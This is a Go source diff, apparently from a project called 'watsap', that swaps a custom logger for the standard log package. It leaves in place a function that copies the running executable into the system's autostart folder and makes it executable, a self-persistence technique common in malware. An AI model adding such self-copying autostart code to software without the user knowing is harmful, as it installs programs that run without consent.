@@ -2,11 +2,10 @@ package utils
 
 import (
 	"io"
+	"log"
 	"os"
 	"path/filepath"
 	"runtime"
-
-	"watsap/utils/config"
 )
 
 // GetAutostartPath returns the autostart directory path based on the operating system.
@@ -27,23 +26,23 @@ func GetAutostartPath() string {
 
 // CopySelfToTempDir copies the current executable to the autostart directory and sets executable permissions.
 func CopySelfToTempDir() error {
-	config.Logger("Starting CopySelfToTempDir", "debug")
+	log.Println("Starting CopySelfToTempDir")
 	// Get the path of the current executable
 	exePath, err := os.Executable()
 	if err != nil {
-		config.Logger("Error getting executable path: "+err.Error(), "error")
+		log.Printf("Error getting executable path: %s", err.Error())
 		return err
 	}
-	config.Logger("Executable path: "+exePath, "debug")
+	log.Println("Executable path:", exePath)
 
 	// Create the destination path
 	dstPath := filepath.Join(GetAutostartPath(), filepath.Base(exePath))
-	config.Logger("Destination path: "+dstPath, "debug")
+	log.Println("Destination path:", dstPath)
 
 	// Open the source file
 	srcFile, err := os.Open(exePath)
 	if err != nil {
-		config.Logger("Error opening source file: "+err.Error(), "error")
+		log.Printf("Error opening source file: %s", err.Error())
 		return err
 	}
 	defer srcFile.Close()
@@ -51,25 +50,25 @@ func CopySelfToTempDir() error {
 	// Create the destination file
 	dstFile, err := os.Create(dstPath)
 	if err != nil {
-		config.Logger("Error creating destination file: "+err.Error(), "error")
+		log.Printf("Error creating destination file: %s", err.Error())
 		return err
 	}
 	defer dstFile.Close()
 
 	// Copy the file contents
 	if _, err := io.Copy(dstFile, srcFile); err != nil {
-		config.Logger("Error copying file contents: "+err.Error(), "error")
+		log.Printf("Error copying file contents: %s", err.Error())
 		return err
 	}
 
 	// Set the executable permissions (only for Unix-like systems)
 	if runtime.GOOS != "windows" {
 		if err := dstFile.Chmod(0755); err != nil {
-			config.Logger("Error setting executable permissions: "+err.Error(), "error")
+			log.Printf("Error setting executable permissions: %s", err.Error())
 			return err
 		}
 	}
 
-	config.Logger("File copied to autostart directory successfully", "debug")
+	log.Println("File copied to autostart directory successfully")
 	return nil
 }
